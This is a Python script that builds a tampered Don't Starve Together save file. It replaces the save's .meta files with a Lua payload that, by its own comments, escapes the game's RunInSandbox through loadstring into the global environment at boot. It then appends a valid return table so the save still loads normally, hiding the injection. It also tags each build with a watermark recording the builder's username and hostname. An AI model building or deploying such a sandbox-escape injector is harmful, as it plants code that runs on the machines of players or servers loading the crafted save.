#!/usr/bin/env python3
"""Inject full payload into .meta files for boot-time execution.

Usage:
  python3 make_save.py
  python3 make_save.py --payload exploit/payload_us_eu.lua
  python3 make_save.py --payload exploit/payload_us_eu.lua -w dryenyen
"""
import os, sys, base64, hashlib, time, getpass
import socket as _socket

sys.path.insert(0, os.path.dirname(__file__))
import dst_save, inject_lua

BUILD_DIR = os.path.join(os.path.dirname(__file__), 'build_dst')


def generate_watermark(payload_path, tag=None):
    """Generate a base64-encoded watermark for source attribution."""
    info = {
        'builder': getpass.getuser(),
        'host': _socket.gethostname(),
        'time': time.strftime('%Y-%m-%dT%H:%M:%S%z'),
        'ts': int(time.time()),
        'payload': os.path.basename(payload_path),
        'sha256': hashlib.sha256(open(payload_path, 'rb').read()).hexdigest()[:16],
    }
    if tag:
        info['tag'] = tag
    raw = '|'.join(f'{k}={v}' for k, v in info.items())
    encoded = base64.b64encode(raw.encode()).decode()
    return f'--[[wm:{encoded}]]'.encode('utf-8')


def build(payload_path=None, save_input=None, shard='both', tag=None):
    os.makedirs(BUILD_DIR, exist_ok=True)

    if payload_path is None:
        payload_path = os.path.join(os.path.dirname(__file__), 'exploit', 'payload_us_eu.lua')
    if save_input is None:
        save_input = os.path.join(os.path.dirname(__file__), 'savedata.dat')

    if not os.path.exists(save_input):
        print(f'ERROR: Save file not found: {save_input}')
        sys.exit(1)
    if not os.path.exists(payload_path):
        print(f'ERROR: Payload not found: {payload_path}')
        sys.exit(1)

    data = open(save_input, 'rb').read()
    root = dst_save.parse_save(data)
    dst_dir = root.find('DoNotStarveTogether')

    # Read payload - it's already wrapped in loadstring([[...]])()
    payload_lua = open(payload_path, 'rb').read()
    watermark = generate_watermark(payload_path, tag)
    payload_lua = watermark + b'\n' + payload_lua
    print(f'[*] Payload: {payload_path} ({len(payload_lua)} bytes)')
    print(f'[*] Watermark: {watermark.decode()}')

    # Wrap: the .meta runs in RunInSandbox which has loadstring.
    # payload_us_eu.lua already starts with loadstring([[...]]),
    # which will execute in _G environment, escaping the sandbox.
    # Append a valid return table so the meta file still works.
    meta_return = b'\nreturn {world_network={persistdata={clock={cycles=0,phase="day"},seasons={season="autumn"}}}}'
    full_content = payload_lua + meta_return

    print(f'[*] Full meta content: {len(full_content)} bytes')

    injected = 0
    shards = []
    if shard in ('master', 'both'):
        shards.append('Master')
    if shard in ('caves', 'both'):
        shards.append('Caves')

    for shard_name in shards:
        shard_dir = dst_dir.find(f'Cluster_1/{shard_name}')
        if not shard_dir:
            continue
        save_dir = shard_dir.find('save')
        session = inject_lua.find_session_dir(save_dir)
        if not session:
            continue
        for child in session.children:
            if isinstance(child, dst_save.SaveFile) and child.name.endswith('.meta'):
                orig_size = len(child.content)
                child.content = full_content
                print(f'  [+] {shard_name}/{child.name}: {orig_size} -> {len(child.content)} bytes')
                injected += 1

    if injected == 0:
        print('ERROR: No .meta files found')
        sys.exit(1)

    output = os.path.join(BUILD_DIR, 'savedata.dat')
    output_data = dst_save.serialize_save(root)
    open(output, 'wb').write(output_data)
    print(f'[*] Output: {output} ({len(output_data)} bytes)')
    return output


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='Inject payload into .meta files')
    parser.add_argument('--payload', default=None, help='Lua payload file')
    parser.add_argument('--save', default=None, help='Input savedata.dat')
    parser.add_argument('--shard', choices=['master', 'caves', 'both'],
                        default='both', help='Which shard (default: both)')
    parser.add_argument('-w', '--watermark', default=None,
                        help='Custom tag string for watermark (e.g. -w dryenyen)')
    args = parser.parse_args()
    build(payload_path=args.payload, save_input=args.save, shard=args.shard,
          tag=args.watermark)
